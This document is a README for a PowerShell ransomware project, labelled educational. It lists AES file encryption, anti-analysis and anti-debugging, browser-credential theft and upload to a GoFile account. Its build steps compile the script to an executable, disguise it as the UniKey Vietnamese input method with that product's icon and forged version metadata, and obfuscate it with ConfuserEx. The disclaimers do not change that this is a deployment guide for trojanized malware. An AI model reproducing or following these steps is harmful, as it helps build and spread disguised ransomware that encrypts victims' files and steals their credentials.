# Small Ransomware
## Building a Small Ransomware for Learning Purposes

> **Disclaimer**: This project is created for educational purposes only. The author does not condone or support the use of ransomware for malicious purposes. This code is provided to help understand how ransomware works and how to protect against it.

## Table of Contents
- [Overview](#overview)
- [Features](#features)
- [Technical Details](#technical-details)
- [Installation Guide](#installation-guide)
- [Configuration](#configuration)
- [Security Considerations](#security-considerations)

## Overview
This project demonstrates the implementation of a basic ransomware using PowerShell. It includes various security features and anti-analysis techniques commonly found in real-world ransomware. The project is designed to help security researchers and developers understand ransomware behavior and develop better defense mechanisms.

## Features

### 1. Core Features
- **Advanced Encryption**: Implements AES-256 encryption for file security
- **Automated Process**: Self-contained execution with minimal user interaction
- **Notification System**: Creates detailed README.txt with encryption status
- **Cleanup Mechanism**: Automatic removal of source files post-execution

### 2. Security Features
- **Anti-Analysis**: Multiple techniques to detect and evade analysis environments
- **Anti-Debugging**: Comprehensive protection against debugging attempts
- **String Protection**: Encrypted strings to prevent static analysis
- **Code Obfuscation**: Advanced obfuscation techniques to hinder reverse engineering
- **Self-Protection**: Automatic cleanup to prevent forensic analysis

### 3. Additional Capabilities
- **Data Collection**: Automated collection of browser credentials
- **Data Exfiltration**: Secure upload of collected data
- **Resource Management**: Efficient handling of temporary files
- **Process Control**: Sophisticated execution flow management

## Technical Details

### Encryption Implementation
- Algorithm: AES-256 (CBC mode)
- Key Generation: Cryptographically secure random number generation
- File Handling: Stream-based encryption for large files

### Anti-Analysis Techniques
- Environment detection
- Process monitoring
- Timing checks
- Memory analysis prevention

## Installation Guide

### Prerequisites
- Windows 10 or later
- PowerShell 5.1 or higher
- Resource Hacker
- ConfuserEx

### Step 1: Create Executable
```powershell
Invoke-PS2EXE .\ransomeware.ps1 .\UniKeyNT.exe -iconFile .\UniKey.ico
```

### Step 2: Modify Application Information
Use Resource Hacker to update the executable's metadata:

#### Version Information
```rc
1 VERSIONINFO
FILEVERSION 4,2,0,0
PRODUCTVERSION 4,2,0,0
FILEOS 0x4
FILETYPE 0x1
{
    BLOCK "StringFileInfo"
    {
        BLOCK "000004b0"
        {
            VALUE "CompanyName", "UniKey Software"
            VALUE "FileDescription", "UniKey Vietnamese Input Method"
            VALUE "FileVersion", "4.2.0.0"
            VALUE "InternalName", "UniKeyNT"
            VALUE "LegalCopyright", "© 2023 UniKey Software. All rights reserved."
            VALUE "LegalTrademarks", "UniKey is a trademark of UniKey Software"
            VALUE "OriginalFilename", "UniKeyNT.exe"
            VALUE "ProductName", "UniKey"
            VALUE "ProductVersion", "4.2.0.0"
            VALUE "Assembly Version", "4.2.0.0"
            VALUE "Comments", "Official website: https://www.unikey.org"
        }
    }
    BLOCK "VarFileInfo"
    {
        VALUE "Translation", 0x0000 0x04B0
    }
}
```

#### Application Manifest
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
    <assemblyIdentity version="4.2.0.0" name="UniKey.app"/>
    <trustInfo xmlns="urn:schemas-microsoft-com:asm.v2">
        <security>
            <requestedPrivileges xmlns="urn:schemas-microsoft-com:asm.v3">
                <requestedExecutionLevel level="asInvoker" uiAccess="false"/>
            </requestedPrivileges>
        </security>
    </trustInfo>
    <compatibility xmlns="urn:schemas-microsoft-com:compatibility.v1">
        <application>
            <supportedOS Id="{e2011457-1546-43c5-a5fe-008deee3d3f0}"/> <!-- Windows Vista -->
            <supportedOS Id="{35138b9a-5d96-4fbd-8e2d-a2440225f93a}"/> <!-- Windows 7 -->
            <supportedOS Id="{4a2f9410-7c91-11cf-8e2d-00aa0047b6e6}"/> <!-- Windows 8 -->
            <supportedOS Id="{1f676c76-80e1-4239-95bb-83d0f6d0da78}"/> <!-- Windows 8.1 -->
            <supportedOS Id="{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}"/> <!-- Windows 10 -->
        </application>
    </compatibility>
</assembly>
```

### Step 3: Application Protection
1. Download ConfuserEx from: https://github.com/mkaring/ConfuserEx/releases
2. Configure protection settings:
   - Select Maximum protection preset
   - Enable all available protection features
   - Apply to UniKeyNT.exe
3. Execute protection process
4. Locate protected file in Confused directory

## Configuration

### Required Settings
- **GoFile Token**: Set `$kz9qW3n` to your GoFile account token
- **Storage Folder**: Set `$r7mP8vT` to your target GoFile folder ID

## Security Considerations
- This project is for educational purposes only
- Do not use this code for malicious purposes
- Always test in a controlled environment
- Implement proper security measures when handling sensitive data
- Follow ethical guidelines and local laws

	
